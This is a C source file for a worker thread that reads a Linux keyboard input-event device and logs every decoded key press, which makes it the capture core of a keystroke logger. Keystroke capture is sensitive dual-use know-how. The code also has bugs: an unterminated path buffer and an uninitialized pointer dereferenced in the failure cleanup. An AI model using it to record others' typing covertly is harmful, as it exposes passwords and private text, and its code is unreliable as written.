/* kb_reader.c */
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>

#include <kb_worker.h>
#include <kb_mapper.h>
#include <kb_decoder.h>
#include <logs/logger.h>

#define TRUE 1

#define DONT_RESET      0
#define RESET           1

#define FAILED_TO_READ "Failed to read event file"
#define FAILED_TO_OPEN "Failed to open event file"
#define DISCONNECTED   "Disconnected"

#define START_CAPTURE  "Start capturing..."
#define RESETTING      "Resetting..."

struct kb_worker_cleanup_infos {
    struct kb_worker *kb_worker;
    int    device_file_fd;
    int    reset;
};

static void killed_worker(void *arg) {
    // Cleanup handler.
    struct kb_worker_cleanup_infos *cleanup_infos = (struct kb_worker_cleanup_infos *) arg;
    // Close the open device files.
    if (cleanup_infos->device_file_fd != -1) close(cleanup_infos->device_file_fd);
    // Set worker state.
    if (cleanup_infos->reset) {
        cleanup_infos->kb_worker->kb_status = KB_WORKER_RESET;
        make_terminal_log(RESETTING, cleanup_infos->kb_worker->kb_id);
    }
    else {
        cleanup_infos->kb_worker->kb_status = KB_WORKER_FAILED;
        make_terminal_log(DISCONNECTED, cleanup_infos->kb_worker->kb_id);
    }
}

_Noreturn void *start_worker(void *worker) {
    struct kb_worker_cleanup_infos cleanup_infos;
    struct kb_worker *worker_infos = (struct kb_worker *) worker;
    struct input_event device_event; // Current keyboard device event.
    struct kb_dec_key *decoded;
    char device_event_path[strlen(worker_infos->kb_event_file) - 1];
    // Remove an empty extra character that came from the parse.
    make_terminal_log(START_CAPTURE, worker_infos->kb_id);
    pthread_cleanup_push(killed_worker, (void *) &cleanup_infos);
    strncpy(device_event_path, worker_infos->kb_event_file, strlen(worker_infos->kb_event_file) - 1);

    int device_fd = open(device_event_path, O_RDONLY);
    if (device_fd == -1) {
        make_terminal_log(FAILED_TO_OPEN, worker_infos->kb_id);
        cleanup_infos.device_file_fd = -1;
        cleanup_infos.reset = DONT_RESET;
        pthread_exit(0);
    }
    // Save the cleanup data.
    cleanup_infos.kb_worker = worker_infos;
    cleanup_infos.device_file_fd = device_fd;
    cleanup_infos.reset = RESET;

    worker_infos->kb_status = KB_WORKER_RUNNING;
    while (TRUE) {
        if (read(device_fd, &device_event, sizeof(device_event)) == -1) {
            make_terminal_log(FAILED_TO_READ, worker_infos->kb_id);
            cleanup_infos.reset = DONT_RESET;
            pthread_exit(0);
        }

        if (device_event.type == 1 && device_event.value == 1) {
            decoded = decode(device_event.code);
            if (decoded == NULL) continue;
            make_keystroke_log(decoded->kb_key_name, worker_infos->kb_id);
        }
    }
    pthread_cleanup_pop(killed_worker);
}